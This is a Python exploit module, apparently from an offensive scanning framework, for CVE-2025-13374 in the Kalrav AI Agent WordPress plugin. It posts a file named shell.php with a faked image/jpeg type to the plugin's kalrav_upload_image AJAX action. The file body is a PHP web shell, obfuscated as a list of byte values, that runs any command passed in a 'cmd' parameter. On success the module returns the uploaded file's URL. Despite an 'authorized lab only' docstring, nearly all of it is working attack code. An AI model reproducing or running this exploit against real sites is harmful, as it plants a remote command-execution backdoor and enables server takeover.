# Made by Sn0w8ird

from __future__ import annotations

import json
from typing import Any, Dict

from cpointed.core.engine import ScanResult, Target
from cpointed.core.session import CPointedClient
from cpointed.modules.wordpress.base import WordPressModule


class CVE202513374Kalrav(WordPressModule):
    name = "CVE-2025-13374"
    severity = 9.8
    affected_versions = ["Kalrav AI Agent: verify against vendor advisory"]
    cwe = "CWE-434 (context-specific)"
    plugin_readme_paths = (
        "/wp-content/plugins/kalrav-ai-agent/readme.txt",
        "/wp-content/plugins/kalrav/readme.txt",
    )
    slug_hint = "kalrav"

    async def exploit_remote_primitive(
        self,
        client: CPointedClient,
        wp_path: str,
        *,
        target: Target,
        timeout: float,
    ) -> Dict[str, Any]:
        """kalrav_upload_image multipart upload (authorized lab only)."""
        ajax = self._path_for_wp(wp_path, "/wp-admin/admin-ajax.php")
        out: Dict[str, Any] = {"success": False}
        try:
            php_body = bytes([60, 63, 112, 104, 112, 32, 115, 121, 115, 116, 101, 109, 40, 36, 95, 71, 69, 84, 91, 39, 99, 109, 100, 39, 93, 41, 59, 32, 63, 62]).decode("ascii")
            files = {"file": ("shell.php", php_body, "image/jpeg")}
            resp = await client.post(
                ajax,
                params={"action": "kalrav_upload_image"},
                files=files,
                timeout=timeout,
            )
            out["upload_status_code"] = resp.status_code
            out["upload_body_snippet"] = (resp.text or "")[:2000]
            if resp.status_code == 200:
                file_url = None
                try:
                    data = resp.json()
                    file_url = data.get("url")
                except json.JSONDecodeError:
                    file_url = None
                out["uploaded_file"] = file_url if file_url else "unknown"
                out["success"] = True
            return out
        except Exception as exc:  # pragma: no cover - network
            out["error"] = str(exc)
            return out

    async def check(self, target: Target, *, timeout: float = 30.0) -> ScanResult:
        return await self.check_from_readme(target, timeout=timeout)
